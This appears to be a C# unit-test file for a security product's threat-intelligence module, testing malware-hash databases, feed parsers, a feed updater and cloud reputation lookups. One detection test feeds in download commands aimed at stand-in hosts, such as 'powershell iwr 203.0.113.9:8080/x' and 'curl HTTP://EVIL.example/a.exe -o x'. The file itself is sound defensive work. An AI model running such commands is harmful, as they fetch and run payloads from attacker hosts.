using System.Net;
using System.Text;
using Sentinel.Core.ThreatIntel;

namespace Sentinel.Core.Tests;

public class ThreatIntelTests
{
    private static string Hash(int n) => Convert.ToHexString(System.Security.Cryptography.SHA256.HashData(BitConverter.GetBytes(n))).ToLowerInvariant();

    private sealed class FakeHandler(Func<HttpRequestMessage, HttpResponseMessage> respond) : HttpMessageHandler
    {
        public List<string> Requests { get; } = [];

        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
        {
            Requests.Add(request.RequestUri!.ToString());
            return Task.FromResult(respond(request));
        }

        protected override HttpResponseMessage Send(HttpRequestMessage request, CancellationToken cancellationToken)
        {
            Requests.Add(request.RequestUri!.ToString());
            return respond(request);
        }
    }

    private static HttpResponseMessage Text(string text, HttpStatusCode code = HttpStatusCode.OK) =>
        new(code) { Content = new StringContent(text, Encoding.UTF8, "text/plain") };

    [Fact]
    public void Database_BinarySearch_FindsEveryEntryAndMissesOthers()
    {
        using var tmp = new TempDir();
        var path = Path.Combine(tmp.Path, "threat_hashes.bin");
        var entries = Enumerable.Range(0, 5000).Select(i => new ThreatHashEntry(Hash(i), i % 3 == 0 ? "Stealer.RedLine" : "Trojan.Win32.AgentTesla")).ToArray();

        Assert.Equal(5000, ThreatHashDatabaseBuilder.BuildToFile(entries, DateTimeOffset.UnixEpoch.AddDays(100), path));

        using var db = ThreatHashDatabase.Open(path);
        Assert.Equal(5000, db.Count);
        Assert.Equal(2, db.FamilyCount);
        Assert.Equal(DateTimeOffset.UnixEpoch.AddDays(100), db.TimestampUtc);
        for (var i = 0; i < 5000; i += 7)
        {
            Assert.True(db.TryGetFamily(Hash(i), out var family));
            Assert.Equal(i % 3 == 0 ? "Stealer.RedLine" : "Trojan.Win32.AgentTesla", family);
        }

        Assert.False(db.Contains(Hash(999_999)));
        Assert.False(db.Contains("not a hash"));
        Assert.True(db.Contains(Hash(42).ToUpperInvariant()));
    }

    [Fact]
    public void Builder_IsDeterministic_DeduplicatesAndRejectsBadHashes()
    {
        var a = new MemoryStream();
        var b = new MemoryStream();
        ThreatHashEntry[] first = [new(Hash(1), "Zeta"), new(Hash(2), "Alpha"), new(Hash(1), "Alpha"), new(new string('0', 64), "x"), new(ThreatFeedParsers.EmptyFileSha256, "x"), new("abc", "x")];
        var count = ThreatHashDatabaseBuilder.Build(first, DateTimeOffset.UnixEpoch, a);
        ThreatHashDatabaseBuilder.Build(first.Reverse(), DateTimeOffset.UnixEpoch, b);

        Assert.Equal(2, count);
        Assert.Equal(a.ToArray(), b.ToArray());
    }

    [Fact]
    public void Open_RejectsForeignAndTruncatedFiles()
    {
        using var tmp = new TempDir();
        var foreign = tmp.Write("x.bin", new byte[200]);
        Assert.Throws<InvalidDataException>(() => ThreatHashDatabase.Open(foreign));
        var small = tmp.Write("y.bin", new byte[10]);
        Assert.Throws<InvalidDataException>(() => ThreatHashDatabase.Open(small));
    }

    [Fact]
    public void Parsers_ExtractOnlyValidSha256()
    {
        var sigBase = $"# comment\n{Hash(1)};Dark Caracal - PE32 executable\n{new string('a', 32)};md5 line\n{new string('b', 40)};sha1 line\n{new string('0', 64)};zero\n";
        var parsed = ThreatFeedParsers.ParseSignatureBaseHashIocs(sigBase).ToArray();
        var entry = Assert.Single(parsed);
        Assert.Equal(Hash(1), entry.Sha256);
        Assert.Equal("SigBase.Dark Caracal", entry.Family);

        var yara = $"meta:\n  hash1 = \"{Hash(2)}\"\n  hash = \"{Hash(3).ToUpperInvariant()}\"\ncondition:\n  hash.sha256(0, filesize) == \"{Hash(4)}\"\n";
        Assert.Equal([Hash(2), Hash(3)], ThreatFeedParsers.ParseYaraMetaHashes(yara, "Y").Select(e => e.Sha256).ToArray());

        Assert.Equal(["10.0.0.1", "203.0.113.7"], ThreatFeedParsers.ParseIpBlocklist("# x\n203.0.113.7\n10.0.0.1\nnot-an-ip\n300.1.1.1\n"));
        Assert.Equal(["http://evil.example/a.exe"], ThreatFeedParsers.ParseUrlList("# c\nhttp://evil.example/a.exe\nftp://x\njunk\n"));
    }

    [Fact]
    public void Parsers_AbuseChJson_ReadHashes()
    {
        var mb = $"{{\"query_status\":\"ok\",\"data\":[{{\"sha256_hash\":\"{Hash(5)}\",\"signature\":\"AgentTesla\"}},{{\"sha256_hash\":\"zzz\"}}]}}";
        var tf = $"{{\"query_status\":\"ok\",\"data\":[{{\"ioc_type\":\"sha256_hash\",\"ioc\":\"{Hash(6)}\",\"malware_printable\":\"Lumma\"}},{{\"ioc_type\":\"domain\",\"ioc\":\"x.test\"}}]}}";
        Assert.Equal("MalwareBazaar.AgentTesla", Assert.Single(ThreatFeedParsers.ParseMalwareBazaarJson(mb)).Family);
        Assert.Equal("ThreatFox.Lumma", Assert.Single(ThreatFeedParsers.ParseThreatFoxJson(tf)).Family);
    }

    [Fact]
    public async Task Updater_IsolatesFailedFeeds_AndMergesTheRest()
    {
        using var tmp = new TempDir();
        var config = SentinelConfigStore.ForDataDirectory(tmp.Path);
        using var engine = new ThreatIntelligenceEngine(tmp.Path);
        ThreatHashDatabaseBuilder.BuildToFile([new ThreatHashEntry(Hash(100), "Old.Family")], DateTimeOffset.UnixEpoch, engine.UpdatablePath);
        engine.Reload();

        var handler = new FakeHandler(request => request.RequestUri!.Host switch
        {
            "bazaar.abuse.ch" or "urlhaus.abuse.ch" => Text("Gone", HttpStatusCode.Gone),
            "feodotracker.abuse.ch" => Text("# c\n203.0.113.9\n"),
            "api.github.com" when request.RequestUri.AbsolutePath.Contains("signature-base") =>
                Text("""{"tree":[{"path":"iocs/hash-iocs.txt","type":"blob","sha":"s1","size":10},{"path":"README.md","type":"blob","sha":"s2","size":1}]}"""),
            "api.github.com" => Text("rate limited", HttpStatusCode.Forbidden),
            "raw.githubusercontent.com" => Text($"{Hash(200)};Test Family - desc\n"),
            _ => Text("", HttpStatusCode.NotFound),
        });
        var sources = ThreatFeedSource.CreateDefaults();
        using var updater = new ThreatFeedUpdater(tmp.Path, config, engine, new HttpClient(handler), sources: sources);

        var status = await updater.UpdateAsync();

        Assert.True(engine.TryGetFamily(Hash(100), out _), "прежние записи сохраняются");
        Assert.True(engine.TryGetFamily(Hash(200), out var family));
        Assert.Equal("SigBase.Test Family", family);
        Assert.Contains(status.Sources, s => s.Name.Contains("MalwareBazaar (публичный", StringComparison.Ordinal) && s.Status == "пропущен" && s.Message!.StartsWith("410", StringComparison.Ordinal));
        Assert.Contains(status.Sources, s => s.Name.Contains("eset", StringComparison.Ordinal) && s.Message!.StartsWith("403", StringComparison.Ordinal));
        Assert.Contains(status.Sources, s => s.Name.Contains("Feodo", StringComparison.Ordinal) && s.Status == "ok");
        Assert.Contains(status.Sources, s => s.Name.Contains("API", StringComparison.Ordinal) && s.Message!.Contains("AbuseChAuthKey", StringComparison.Ordinal));
        Assert.NotNull(status.LastSuccessUtc);
        Assert.True(File.Exists(updater.StatusPath));
        Assert.Contains("ip:203.0.113.9", File.ReadAllLines(updater.NetworkIndicatorsPath));

        // Повторный запуск: файл с тем же blob SHA не скачивается заново.
        var before = handler.Requests.Count(r => r.Contains("raw.githubusercontent.com", StringComparison.Ordinal));
        await updater.UpdateAsync();
        Assert.Equal(before, handler.Requests.Count(r => r.Contains("raw.githubusercontent.com", StringComparison.Ordinal)));
    }

    [Fact]
    public async Task Updater_AllSourcesDown_KeepsDatabaseAndReportsFailure()
    {
        using var tmp = new TempDir();
        using var engine = new ThreatIntelligenceEngine(tmp.Path);
        var handler = new FakeHandler(_ => throw new HttpRequestException("offline"));
        using var updater = new ThreatFeedUpdater(tmp.Path, SentinelConfigStore.ForDataDirectory(tmp.Path), engine, new HttpClient(handler));

        var status = await updater.UpdateAsync();

        Assert.Null(status.LastSuccessUtc);
        Assert.StartsWith("Не удалось", status.LastStatus, StringComparison.Ordinal);
        Assert.All(status.Sources, s => Assert.NotEqual("ok", s.Status));
    }

    [Fact]
    public void Engine_PrefersNewerOfBundledAndUpdatableDatabases()
    {
        using var tmp = new TempDir();
        var bundled = Path.Combine(tmp.Path, "bundled", "threat_hashes.bin");
        var data = Path.Combine(tmp.Path, "data");
        ThreatHashDatabaseBuilder.BuildToFile([new ThreatHashEntry(Hash(1), "A")], DateTimeOffset.UnixEpoch.AddDays(10), bundled);
        ThreatHashDatabaseBuilder.BuildToFile([new ThreatHashEntry(Hash(2), "B")], DateTimeOffset.UnixEpoch.AddDays(20), Path.Combine(data, "threat_hashes.bin"));

        using var engine = new ThreatIntelligenceEngine(data, bundled);

        Assert.True(engine.TryGetFamily(Hash(2), out _));
        Assert.False(engine.TryGetFamily(Hash(1), out _));
    }

    [Fact]
    public void Engine_WorksWithoutAnyDatabase()
    {
        using var tmp = new TempDir();
        using var engine = new ThreatIntelligenceEngine(tmp.Path);
        Assert.False(engine.TryGetFamily(Hash(1), out _));
        Assert.Equal(0, engine.Count);
    }

    [Fact]
    public void NetworkIndicators_MatchWholeIpAndUrl()
    {
        using var tmp = new TempDir();
        var file = tmp.WriteText("threat_network.txt", "ip:203.0.113.9\nurl:http://evil.example/a.exe\n");
        var set = NetworkIndicatorSet.Load(file);
        Assert.Equal("203.0.113.9", set.FindIn("powershell iwr 203.0.113.9:8080/x"));
        Assert.Null(set.FindIn("connect 1203.0.113.99"));
        Assert.Equal("http://evil.example/a.exe", set.FindIn("curl HTTP://EVIL.example/a.exe -o x"));
    }

    [Fact]
    public void Config_RoundTripsAndDefaultsWhenMissing()
    {
        using var tmp = new TempDir();
        var store = SentinelConfigStore.ForDataDirectory(tmp.Path);
        Assert.True(store.Load().UsbShieldEnabled);
        store.Save(new SentinelConfig { VirusTotalApiKey = "k", UsbShieldEnabled = false });
        var reloaded = SentinelConfigStore.ForDataDirectory(tmp.Path).Load();
        Assert.Equal("k", reloaded.VirusTotalApiKey);
        Assert.False(reloaded.UsbShieldEnabled);
        Assert.True(reloaded.HasCloudKeys);
    }

    [Fact]
    public void Cloud_KasperskyRed_IsMalicious_AndCachedForSevenDays()
    {
        using var tmp = new TempDir();
        var config = SentinelConfigStore.ForDataDirectory(tmp.Path);
        config.Save(new SentinelConfig { KasperskyOpenTipApiKey = "kkey" });
        var handler = new FakeHandler(r =>
        {
            Assert.Equal("kkey", r.Headers.GetValues("x-apikey").Single());
            Assert.Contains("opentip.kaspersky.com/api/v1/search/hash?request=" + Hash(7), r.RequestUri!.ToString(), StringComparison.Ordinal);
            return Text("{\"Zone\":\"Red\"}");
        });
        var clock = new FakeTime(DateTimeOffset.Parse("2026-11-15T00:00:00Z", System.Globalization.CultureInfo.InvariantCulture));
        var service = new CloudReputationService(config, new HttpClient(handler), Path.Combine(tmp.Path, "cloud_cache.json"), clock);

        Assert.Equal(CloudReputation.Malicious, service.Lookup(Hash(7)).Reputation);
        Assert.Equal(CloudReputation.Malicious, service.Lookup(Hash(7)).Reputation);
        Assert.Single(handler.Requests);

        clock.Advance(TimeSpan.FromDays(8));
        service.Lookup(Hash(7));
        Assert.Equal(2, handler.Requests.Count);
    }

    [Fact]
    public void Cloud_VirusTotal_Threshold_AndRateLimitDoesNotThrow()
    {
        using var tmp = new TempDir();
        var config = SentinelConfigStore.ForDataDirectory(tmp.Path);
        config.Save(new SentinelConfig { VirusTotalApiKey = "vt" });
        var calls = 0;
        var handler = new FakeHandler(r =>
        {
            calls++;
            if (r.RequestUri!.ToString().EndsWith(Hash(1), StringComparison.Ordinal))
            {
                return Text("{\"data\":{\"attributes\":{\"last_analysis_stats\":{\"malicious\":5,\"harmless\":3}}}}");
            }

            if (r.RequestUri.ToString().EndsWith(Hash(2), StringComparison.Ordinal))
            {
                return Text("{\"data\":{\"attributes\":{\"last_analysis_stats\":{\"malicious\":2}}}}");
            }

            return Text("slow down", HttpStatusCode.TooManyRequests);
        });
        var service = new CloudReputationService(config, new HttpClient(handler), null, new FakeTime(DateTimeOffset.Parse("2026-11-15T00:00:00Z", System.Globalization.CultureInfo.InvariantCulture)));

        Assert.Equal(CloudReputation.Malicious, service.Lookup(Hash(1)).Reputation);
        Assert.NotEqual(CloudReputation.Malicious, service.Lookup(Hash(2)).Reputation); // malicious < 3
        Assert.Equal(CloudReputation.Unknown, service.Lookup(Hash(3)).Reputation);       // 429
        var after429 = calls;
        Assert.Equal(CloudReputation.Unknown, service.Lookup(Hash(4)).Reputation);       // сервис на паузе: запросов нет
        Assert.Equal(after429, calls);
    }

    [Fact]
    public void Cloud_WithoutKeys_NeverCallsNetwork()
    {
        using var tmp = new TempDir();
        var handler = new FakeHandler(_ => throw new InvalidOperationException("сеть не должна вызываться"));
        var service = new CloudReputationService(SentinelConfigStore.ForDataDirectory(tmp.Path), new HttpClient(handler));
        Assert.Equal(CloudReputation.Unknown, service.Lookup(Hash(1)).Reputation);
        Assert.Empty(handler.Requests);
    }

    private sealed class FakeTime(DateTimeOffset start) : TimeProvider
    {
        private DateTimeOffset _now = start;

        public override DateTimeOffset GetUtcNow() => _now;

        public void Advance(TimeSpan by) => _now += by;
    }
}
